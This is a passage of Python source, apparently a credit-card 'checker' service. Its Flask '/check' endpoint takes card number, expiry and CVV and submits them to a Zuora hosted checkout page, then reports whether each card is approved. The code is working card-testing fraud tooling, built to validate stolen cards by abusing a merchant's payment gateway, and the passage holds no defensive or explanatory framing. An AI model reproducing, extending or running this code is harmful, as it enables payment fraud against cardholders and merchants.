                    "encodedZuoraIframeInfo": "eyJpc0Zvcm1FeGlzdCI6dHJ1ZSwiaXNGb3JtSGlkZGVuIjpmYWxzZSwienVvcmFFbmRwb2ludCI6Imh0dHBzOi8vd3d3Lnp1b3JhLmNvbS9hcHBzLyIsImZvcm1XaWR0aCI6NzE2LjMsImZvcm1IZWlnaHQiOjExMTQuNzcsImxheW91dFN0eWxlIjoiYnV0dG9uT3V0c2lkZSIsInp1b3JhSnNWZXJzaW9uIjoiIiwiZm9ybUZpZWxkcyI6W3siaWQiOiJmb3JtLWVsZW1lbnQtY3JlZGl0Q2FyZFR5cGUiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmROdW1iZXIiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRFeHBpcmF0aW9uWWVhciIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZEhvbGRlck5hbWUiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRDb3VudHJ5IiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6ZmFsc2V9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkU3RhdGUiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LWNyZWRpdENhcmRBZGRyZXNzMSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZUFkZHJlc3MyIiwiZXhpc3RzIjp0cnVlLCJpc0hpZGRlbiI6ZmFsc2V9LHsiaWQiOiJpbnB1dC1jcmVkaXRDYXJkQ2l0eSIsImV4aXN0cyI6dHJ1ZSwiaXNIaWRkZW4iOmZhbHNlfSx7ImlkIjoiaW5wdXQtY3JlZGl0Q2FyZFBvc3RhbENvZGUiLCJleGlzdHMiOnRydWUsImlzSGlkZGVuIjpmYWxzZX0seyJpZCI6ImlucHV0LXBob25lIiwiZXhpc3RzIjpmYWxzZSwiaXNIaWRkZW4iOnRydWV9LHsiaWQiOiJpbnB1dC1lbWFpbCIsImV4aXN0cyI6ZmFsc2UsImlzSGlkZGVuIjp0cnVlfV19"
                }
                req = web.post("https://api.zuora.com/apps/PublicHostedPageLite.do", headers=headers, data=data)
                if self._Capture(req.text, 'success":"', '"') == "true":
                    Message = "Approved"
                    Status = True
                    return Message, Status
                Message = self._Capture(req.text, 'errorMessage":"', '"')
                if not Message:
                    SiteError = "Error Post Checkout"
                    break
                Status = self._VerifyStatusResponse(Message)
                return Message, Status
            except Exception as u:
                SiteError = f"Error Post Checkout | {u}"
                break

        return SiteError, GatewaysErrorStatus

@app.route('/check', methods=['GET', 'POST'])
def check_card():
    if request.method == 'GET':
        cc = request.args.get('cc')
    else:
        data = request.json
        cc = data.get('cc') or data.get('card')
    
    if not cc:
        return jsonify({'error': 'Card details required. Use: ?cc=number|month|year|cvv'}), 400
    
    try:
        _card, _mm, _yy, _cvv = cc.split('|')
    except ValueError:
        return jsonify({'error': 'Invalid card format. Use: number|month|year|cvv'}), 400
    
    result = GatewaysDeveloper().Run(_card, _mm, _yy, _cvv)
    return jsonify(result), 200

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy'}), 200

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'message': 'API is running',
        'usage': '/check?cc=number|month|year|cvv'
    }), 200
